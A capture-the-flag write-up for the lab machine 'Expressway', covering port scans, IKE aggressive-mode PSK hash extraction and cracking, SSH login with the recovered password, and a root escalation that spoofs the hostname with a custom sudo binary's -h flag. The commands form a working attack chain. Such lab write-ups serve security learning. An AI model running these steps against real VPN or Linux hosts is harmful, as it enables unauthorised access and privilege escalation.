# CTF Writeup : Expressway 

> **Author:** Mr Axidion  
> **Date:** 2026-01-02  
> **Target IP:** `10.10.11.87`  

---

## 1. Enumeration

The engagement started with an `nmap` scan to identify open ports and running services on the target.

### TCP Scan

```bash
nmap -sC -sV -oN nmap_report 10.10.11.87
```

**Results:**

| Port | Service | Version |
|------|--------|--------|
| 22/tcp | SSH | OpenSSH 10.0p2 Debian |

**Analysis:**

Only SSH was exposed over TCP. Typically, SSH is not easily exploitable unless there is a known vulnerability or weak credentials. Since no immediate attack vector was found, the focus shifted to UDP services.

---

### UDP Scan

To expand the attack surface, a UDP scan was performed:

```bash
nmap -sU -sV 10.10.11.87
```

**Key Findings:**

- 500/udp → ISAKMP (IKE)  
- 4500/udp → IPsec NAT-T  

**Analysis:**

These services indicate that the target is running an **IPsec VPN**. This is a valuable attack surface, especially if the Pre-Shared Key (PSK) can be extracted and cracked.

---

## 2. IKE Exploitation

To gather more details about the VPN configuration, `ike-scan` was used.

### Discovering Main Mode

```bash
sudo ike-scan -M 10.10.11.87
```

The scan confirmed that the server supports **Main Mode** and revealed encryption details such as `3DES` and `SHA1`, which are considered outdated.

---

### Switching to Aggressive Mode

Since Main Mode does not expose sensitive data, the next step was to attempt **Aggressive Mode**, which is less secure and may leak the PSK hash.

```bash
sudo ike-scan -A -Ppsk.txt 10.10.11.87
```

**Result:**

The server responded successfully, revealing the identity:

```
ike@expressway.htb
```

---

### Extracting the Hash

The PSK hash was extracted for offline cracking:

```bash
sudo ike-scan -M --aggressive 10.10.11.87 -n ike@expressway.htb --pskcrack=hash.txt
```

---

## 3. Cracking & Initial Access

The extracted hash was cracked using `psk-crack` and the `rockyou.txt` wordlist:

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

**Recovered Credentials:**

```
Username: ike
Password: freakingrockstarontheroad
```

Using these credentials, SSH access was obtained:

```bash
ssh ike@10.10.11.87
```

**User Flag:**

```
5d2337be0ac70423d2c4ac8049*****
```

---

## 4. Privilege Escalation

After gaining access, further enumeration was required to escalate privileges.

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Finding:**

```
/usr/local/bin/sudo
```

This is unusual, as the standard sudo binary is located at `/usr/bin/sudo`. This suggests a custom or modified binary.

---

### Log Analysis

Since the user `ike` appeared to be related to proxy usage, logs were inspected:

```bash
cat /var/log/squid/access.log.1
```

**Key Finding:**

```
http://offramp.expressway.htb
```

This internal hostname appeared to be relevant for further exploitation.

---

### Exploiting Hostname-Based Sudo Restriction

The custom sudo version (`1.9.17`) contained a logic flaw. If sudo privileges are restricted based on hostname, the `-h` flag can be used to spoof the hostname.

### Exploit

```bash
/usr/local/bin/sudo -h offramp.expressway.htb -i
```

This successfully bypassed the restriction and granted a root shell.

---

## 5. Root Access

**Root Flag:**

```
db3f1de3c148b5901ef15b24bf4****
```

---

## Conclusion

This machine demonstrates:

- The importance of UDP scanning when TCP enumeration provides limited results  
- Weaknesses in IPsec configurations using Aggressive Mode  
- The risks of weak pre-shared keys (PSK)  
- The dangers of custom or misconfigured binaries, especially with privilege control  

Each step highlights how small misconfigurations can chain together into full system compromise.
